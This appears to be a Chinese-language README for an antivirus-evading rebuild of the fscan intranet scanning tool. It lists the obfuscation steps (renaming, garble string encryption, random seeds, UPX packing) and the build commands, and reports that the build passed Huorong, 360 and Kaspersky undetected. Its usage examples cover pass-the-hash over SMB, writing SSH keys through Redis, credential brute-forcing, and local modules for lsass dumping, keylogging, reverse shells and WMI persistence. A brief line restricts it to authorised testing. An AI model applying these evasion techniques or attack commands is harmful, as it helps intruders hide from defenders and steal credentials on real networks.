# Fscan 免杀版

基于 fscan 2.1.3 进行简单免杀处理的内网综合扫描工具。



**产物**: `fscan_upx.exe` (22.69 MB) | **测试环境**: Windows 10 + 火绒+360+卡巴

## 免杀处理清单

| 步骤 | 处理项 | 说明 |
|------|--------|------|
| 1 | 模块重命名 | `github.com/shadow1ng/fscan` → `test/scan`，去除原项目指纹 |
| 2 | 参数自定义 | 去除 fscan 特征参数名（见下方参数对照表） |
| 3 | 去除 Banner | 注释 `Banner()` 调用，消除启动特征 |
| 4 | garble `-tiny` | 剥离调试信息、源码路径、panic 回溯信息 |
| 5 | garble `-literals` | 加密所有字符串常量，消除明文特征 |
| 6 | garble `-seed=random` | 随机化混淆种子，每次编译产出不同二进制 |
| 7 | ldflags `-w -s` | 去除 DWARF 调试表 + 符号表 |
| 8 | UPX `--best --lzma` | 体积压缩至 22.69 MB + 打乱 PE 结构 |
| 9 | 顺便改了一波图标

## 参数对照表

| 原参数 | 新参数 | 说明 |
|--------|--------|------|
| `-h` | `-t` | 目标主机 (target) |
| `-t` | `-c` | 并发线程数 (concurrency) |
| `-p` | `-port` | 端口范围 |
| `-m` | `-mode` | 扫描模式 |
| `-time` | `-timeout` | 超时时间 |
| `-u` | `-url` | 目标 URL |
| `-o` | `-out` | 输出文件 |
| `-f` | `-fmt` | 输出格式 |

其余参数名不变（如 `-user`、`-pwd`、`-np`、`-nobr`、`-silent` 等）。

## 快速开始

```bash
# 扫描C段
fscan_upx.exe -t 192.168.1.1/24

# 指定端口
fscan_upx.exe -t 192.168.1.1 -port 22,80,443,3389

# 仅存活探测
fscan_upx.exe -t 192.168.1.1/24 -ao

# 禁用爆破
fscan_upx.exe -t 192.168.1.1/24 -nobr

# Web扫描
fscan_upx.exe -url http://192.168.1.1

# Hash碰撞
fscan_upx.exe -t 192.168.1.1 -mode smb2 -user admin -hash xxxxx

# Redis写公钥
fscan_upx.exe -t 192.168.1.1 -mode redis -rf id_rsa.pub

# 本地插件
fscan_upx.exe -local systeminfo

# 静默模式 (NDJSON输出，配合agent/AI管道)
fscan_upx.exe -t 192.168.1.0/24 -silent

# SOCKS5代理扫描内网
fscan_upx.exe -t 10.0.0.0/24 -socks5 127.0.0.1:1080
```

## 编译命令

```powershell
# 前置依赖
# Go 1.20+
# garble v0.10.1+ (go install mvdan.cc/garble@latest)
# UPX 4.2+

# 1. garble 混淆编译
garble -tiny -literals -seed=random build -ldflags="-w -s" -o a.exe main.go

# 2. UPX 加壳压缩
upx --best --lzma a.exe -o fscan_upx.exe
```

## 常用参数速查

### 目标指定

| 参数 | 说明 | 示例 |
|------|------|------|
| `-t` | 目标主机 (IP/CIDR/域名) | `-t 192.168.1.0/24` |
| `-hf` | 从文件读取目标 | `-hf targets.txt` |
| `-port` | 指定端口 (逗号/范围) | `-port 22,80,443` |
| `-ep` | 排除端口 | `-ep 25,110` |
| `-eh` | 排除主机 | `-eh 192.168.1.1` |
| `-url` | 目标 URL (Web扫描) | `-url https://example.com` |
| `-uf` | URL 文件 | `-uf urls.txt` |

### 扫描控制

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `-mode` | 扫描模式 | `all` |
| `-c` | 端口扫描线程数 | `600` |
| `-mt` | 模块线程数 | `20` |
| `-timeout` | 连接超时 (秒) | `3` |
| `-gt` | 全局超时 (秒) | `180` |
| `-np` | 跳过存活检测 | `false` |
| `-ao` | 仅存活检测 | `false` |
| `-nobr` | 禁用暴力破解 | `false` |
| `-nopoc` | 禁用POC扫描 | `false` |

### 认证凭据

| 参数 | 说明 |
|------|------|
| `-user` | 用户名 |
| `-pwd` | 密码 |
| `-userf` | 用户名字典文件 |
| `-pwdf` | 密码字典文件 |
| `-domain` | 域名 (SMB/WMI) |
| `-sshkey` | SSH 私钥文件 |
| `-hash` / `-hashf` | NTLM Hash / Hash 文件 |

### 输出控制

| 参数 | 说明 |
|------|------|
| `-out` | 输出文件 (默认 `result.txt`) |
| `-fmt` | 输出格式: `txt` / `json` / `csv` |
| `-silent` | 静默模式: stdout 仅输出 NDJSON |
| `-no` | 禁用文件保存 |
| `-debug` | 调试模式: 日志写入 `fscan_debug.log` |
| `-nocolor` | 禁用颜色输出 |

## 扫描模式 `-mode` 取值

| 值 | 说明 |
|------|------|
| `all` | 全部扫描 (默认) |
| `icmp` | 仅 ICMP 存活检测 |
| `ssh` / `smb` / `mysql` 等 | 仅运行指定插件 |

## 服务插件

| 插件 | 默认端口 | 功能 |
|------|----------|------|
| `ftp` | 21 | FTP 弱口令 |
| `ssh` | 22 | SSH 弱口令 |
| `telnet` | 23 | Telnet 弱口令 |
| `smtp` | 25 | SMTP 弱口令 |
| `findnet` | 135 | RPC 网络信息发现 |
| `netbios` | 139 | NetBIOS 信息收集 |
| `smb` | 445 | SMB 弱口令 + 信息收集 |
| `ms17010` | 445 | MS17-010 永恒之蓝检测 |
| `ldap` | 389 | LDAP 弱口令 |
| `mssql` | 1433 | MSSQL 弱口令 |
| `oracle` | 1521 | Oracle 弱口令 |
| `mysql` | 3306 | MySQL 弱口令 |
| `rdp` | 3389 | RDP 弱口令 + 系统信息 |
| `postgresql` | 5432 | PostgreSQL 弱口令 |
| `vnc` | 5900 | VNC 弱口令 |
| `redis` | 6379 | Redis 未授权 + 弱口令 + 利用 |
| `elasticsearch` | 9200 | ES 未授权 |
| `mongodb` | 27017 | MongoDB 未授权 + 弱口令 |
| `memcached` | 11211 | Memcached 未授权 |
| `kafka` | 9092 | Kafka 未授权 |
| `activemq` | 61616 | ActiveMQ 弱口令 |
| `rabbitmq` | 5672 | RabbitMQ 弱口令 |
| `cassandra` | 9042 | Cassandra 弱口令 |
| `neo4j` | 7687 | Neo4j 弱口令 |
| `rsync` | 873 | Rsync 未授权 |
| `webtitle` | 80/443 | Web 标题 + 指纹识别 |
| `webpoc` | 80/443 | Web 漏洞 POC |

## 本地插件 (`-local`)

```bash
fscan_upx.exe -local avdetect     # 杀软检测
fscan_upx.exe -local systeminfo   # 系统信息收集
fscan_upx.exe -local envinfo      # 环境变量信息
fscan_upx.exe -local dcinfo       # 域控信息
fscan_upx.exe -local fileinfo     # 敏感文件搜索
fscan_upx.exe -local minidump     # lsass内存转储
fscan_upx.exe -local keylogger    # 键盘记录
fscan_upx.exe -local reverseshell # 反弹Shell
fscan_upx.exe -local socks5proxy  # SOKCS5代理
fscan_upx.exe -local winwmi       # WMI持久化
```

## 免杀测试记录

| 测试项 | 火绒+360+卡巴结果 |
|--------|----------|
| 静态查杀 (fscan_upx.exe) | ✅ 通过 |
| 端口扫描 (132端口 / 600线程) | ✅ 未拦截 |
| 服务识别 (7种服务指纹) | ✅ 未拦截 |
| 弱密码爆破 (25种协议) | ✅ 未拦截 |
| MS17-010 漏洞探测 | ✅ 未拦截 |
| RPC 信息收集 (NetInfo/SMBInfo) | ✅ 未拦截 |
| 持续扫描 (3分44秒) | ✅ 未拦截 |



### 卡巴

正常运行，无告警

![image-20260623230237393](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260623230237393.png)

![image-20260623230437415](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260623230437415.png)



### 360

正常运行，无告警

![image-20260623230600904](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260623230600904.png)

![image-20260623230700001](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260623230700001.png)



### 火绒

懂的都懂，源码、exe都给它扫毫无动静

![image-20260623231056197](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260623231056197.png)

![image-20260623231237592](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260623231237592.png)

## 注意事项

- `-literals` 混淆可能导致部分第三方包的字符串处理异常，如遇报错可先移除该参数编译排障
- UPX 加壳后的 Go 程序在部分环境可能因内存布局问题崩溃，建议部署前充分测试
- 每次 `-seed=random` 编译产出不同二进制，可对抗基于 hash 的静态查杀
- 本工具仅面向**合法授权**的安全测试，请确保在授权范围内使用
- 不同杀软检测能力差异大，火绒等这些通过不代表其他杀软同样免杀
